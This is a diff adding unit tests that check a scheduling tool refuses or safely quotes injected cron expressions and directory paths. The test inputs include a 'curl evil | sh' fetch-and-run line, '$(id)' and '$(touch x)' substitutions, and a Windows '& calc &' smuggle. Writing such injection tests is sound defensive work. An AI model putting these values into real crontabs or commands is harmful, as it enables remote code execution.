@@ -1,5 +1,6 @@
 import { describe, expect, it, vi } from 'vitest';
 import { spawnSync } from 'child_process';
+import { resolve } from 'path';
 
 vi.mock('child_process', async (importOriginal) => {
   const actual = await importOriginal<typeof import('child_process')>();
@@ -14,6 +15,7 @@ vi.mock('../../../platform/executable-resolution.js', async (importOriginal) => 
 
 import {
   buildSchedulePlan,
+  buildScheduledCommand,
   checkOrCreateHarborLabels,
   checkTrackerReachable,
   defaultIntakeRunner,
@@ -137,6 +139,40 @@ describe('buildSchedulePlan', () => {
   it('refuses unsupported expressions on Windows instead of approximating', () => {
     const plan = buildSchedulePlan('win32', '*/7 * * * *', 'omg intake run --headless');
     expect('refused' in plan).toBe(true);
+  });
+
+  it('refuses cron input that would inject crontab lines or command text', () => {
+    for (const expr of [
+      '*/30 * * * *\n* * * * * curl evil | sh',
+      '*/30 * * * * touch /tmp/pwned',
+      '*/30 * * * $(id)',
+      '0 6 * * %',
+      '0 6 * *',
+    ]) {
+      expect('refused' in buildSchedulePlan('linux', expr, 'omg intake run --headless')).toBe(true);
+      expect('refused' in buildSchedulePlan('win32', expr, 'omg intake run --headless')).toBe(true);
+    }
+    const ok = buildSchedulePlan('linux', ' 0 6 * * MON-FRI ', 'omg intake run --headless');
+    expect(ok).toMatchObject({ crontabLine: '0 6 * * MON-FRI omg intake run --headless # omc-intake' });
+  });
+});
+
+describe('buildScheduledCommand', () => {
+  it('single-quotes the cwd for sh so quotes and $() stay literal', () => {
+    const dir = resolve('/tmp/a" $(touch x) \'b');
+    const cmd = buildScheduledCommand(dir, 'linux');
+    expect(cmd).toBe(`omg intake run --headless --allow-docket-only --cwd '${dir.replace(/'/g, `'\\''`)}'`);
+    if (process.platform !== 'win32') {
+      const echoed = spawnSync('sh', ['-c', `printf %s ${cmd.slice(cmd.indexOf('--cwd ') + 6)}`], { encoding: 'utf-8' });
+      expect(echoed.stdout).toBe(dir);
+    }
+  });
+
+  it('refuses a cwd the scheduler quoting cannot carry', () => {
+    expect(() => buildScheduledCommand('/tmp/a\nb', 'linux')).toThrow(/unsupported characters/);
+    expect(() => buildScheduledCommand('/tmp/100%', 'linux')).toThrow(/unsupported characters/);
+    expect(() => buildScheduledCommand('C:\\a" & calc & "', 'win32')).toThrow(/unsupported characters/);
+    expect(buildScheduledCommand('C:\\Code\\repo', 'win32')).toMatch(/--cwd "[^"]*repo"$/);
   });
 });
 
